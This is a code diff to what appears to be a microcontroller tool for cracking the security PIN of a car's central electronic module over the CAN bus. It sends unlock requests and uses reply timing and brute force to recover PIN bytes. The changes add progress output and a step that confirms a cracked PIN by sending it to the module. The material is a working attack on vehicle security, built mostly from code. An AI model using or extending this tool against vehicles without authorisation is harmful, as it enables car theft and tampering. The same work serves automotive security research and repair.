@@ -2,6 +2,7 @@
 /*
  * Copyright (C) 2020 Vitaly Mayatskikh <v.mayatskih@gmail.com>
  *                    Christian Molson <christian@cmolabs.org>
+ *                    Mark Dapoz <md@dapoz.ca>
  *
  * This work is licensed under the terms of the GNU GPL, version 3.
  *
@@ -311,7 +312,7 @@ int cem_print_crack_rate()
   start = millis();
   for (int i = 0; i < NUM_LOOPS; i++) {
     pin[0] = random(0, 255); // Found better average calculation using random number here
-    cem_unlock(pin, &lat, true);
+    cem_unlock(pin, NULL, &lat, true);
     average_response += lat / (clockCyclesPerMicrosecond() / BUCKETS_PER_US);
   }
   end = millis();
@@ -330,9 +331,10 @@ void cem_intr()
   can_intr = true;
 }
 
-bool cem_unlock(byte *pin, int *lat, bool shuffle)
+bool cem_unlock(byte *pin, byte *pin_used, int *lat, bool shuffle)
 {
   byte b[8] = { 0x50, 0xbe };
+  byte r[8];
   byte *p = b + 2;
   unsigned long start, end, limit;
   unsigned long id;
@@ -347,8 +349,9 @@ bool cem_unlock(byte *pin, int *lat, bool shuffle)
     p[shuffle_order[4]] = pin[4];
     p[shuffle_order[5]] = pin[5];
   } else {
-    memcpy(p, pin, 6);
+    memcpy(p, pin, PIN_LEN);
   }
+
   cem_send(0xffffe, b);
   can_intr = false;
   unsigned long mt = 0;
@@ -393,13 +396,19 @@ bool cem_unlock(byte *pin, int *lat, bool shuffle)
 
   /* default reply is set to indicate a failure */
 
-  b[2] = 0xff;
+  bzero (r, sizeof(r));
+  r[2] = 0xff;
 
-  cem_receive(reply_wait, &id, b);
+  cem_receive (reply_wait, &id, r);
 
   *lat = mt;
 
-  return b[2] == 0x00;
+  /* return PIN used and status */
+
+  if (pin_used != NULL) {
+    memcpy(pin_used, p, PIN_LEN);
+  }
+  return r[2] == 0x00;
 }
 
 void cem_read_part_number()
@@ -478,7 +487,7 @@ void crack_pin_pos(byte *pin, int pos)
 
     for (int j = 0; j < SAMPLES; j++) {
       pin[pos + 2] = to_bcd(j);
-      cem_unlock(pin, &lat, shuffle);
+      cem_unlock(pin, NULL, &lat, shuffle);
       int idx = lat / (clockCyclesPerMicrosecond() / BUCKETS_PER_US);
       if (idx >= CEM_REPLY_US)
         idx = CEM_REPLY_US - 1;
@@ -540,8 +549,11 @@ void crack_pin_pos(byte *pin, int pos)
 void cem_crack_pin(int max_bytes)
 {
   byte pin[PIN_LEN] = { 0 };
+  byte pin_used[PIN_LEN];
   long start = millis(), end;
   bool cracked = false;
+  unsigned int percent = 0;
+  unsigned int percent_5;
 
   printf("calculating bytes 0-%d\n", max_bytes - 1);
   crack_rate = cem_print_crack_rate();
@@ -556,6 +568,10 @@ void cem_crack_pin(int max_bytes)
   }
   printf(" -- brute forcing bytes %d to %d (%d bytes), will take up to %d seconds\n", n, PIN_LEN - 1, PIN_LEN - n, (int)(pow(100, PIN_LEN - n) / crack_rate));
 
+  percent_5 = pow(100, (PIN_LEN - n))/20;
+
+  printf ("Progress: ");
+
   for (unsigned long m = 0; m < pow(100, (PIN_LEN - n)); m++) {
     unsigned long f = m;
     for (int k = n; k < PIN_LEN; k++) {
@@ -563,14 +579,63 @@ void cem_crack_pin(int max_bytes)
       f /= 100;
     }
     int lat;
-    if (cem_unlock(pin, &lat, true)) {
-      printf("found PIN: 0x%02x 0x%02x 0x%02x 0x%02x 0x%02x 0x%02x\n", pin[3], pin[1], pin[5], pin[0], pin[2], pin[4]);
+
+    if (cem_unlock(pin, pin_used, &lat, true)) {
+      printf ("done\n");
+      printf ("found PIN: 0x%02x 0x%02x 0x%02x 0x%02x 0x%02x 0x%02x\n",
+              pin_used[0], pin_used[1], pin_used[2], pin_used[3], pin_used[4], pin_used[5]);
+
       cracked = true;
       break;
+    }
+
+    /* print a progress message */
+
+    if ((m % percent_5) == 0) {
+      printf ("%u%%..", percent * 5);
+      percent++;
     }
   }
   end = millis();
   printf("PIN is %scracked in %3.2f seconds\n", cracked ? "" : "NOT ", (end - start) / 1000.0);
+
+  /* validate the PIN if we were able to crack it */
+
+  if (cracked == true) {
+    printf("Validating PIN\n");
+
+    byte data[8];
+    unsigned long can_id = 0;
+
+    /* send the unlock request to the CEM */
+
+    data[0] = 0x50;
+    data[1] = 0xbe;
+    data[2] = pin_used[0];
+    data[3] = pin_used[1];
+    data[4] = pin_used[2];
+    data[5] = pin_used[3];
+    data[6] = pin_used[4];
+    data[7] = pin_used[5];
+
+    cem_send(0xFFFFE, data);
+
+    /* get the response from the CEM */
+
+    bzero (data, sizeof(data));
+
+    (void) cem_receive(true, &can_id, data);
+
+    /* verify the response came from the CEM and is a successful reply to our request */
+
+    if ((can_id == 3) &&
+        (data[0] == 0x50) && (data[1] == 0xb9) && (data[2] == 0x00)) {
+        printf ("PIN verified.\n");
+    } else {
+        printf ("PIN verification failed!\n");
+    }
+  }
+
   printf("done\n");
 }
 
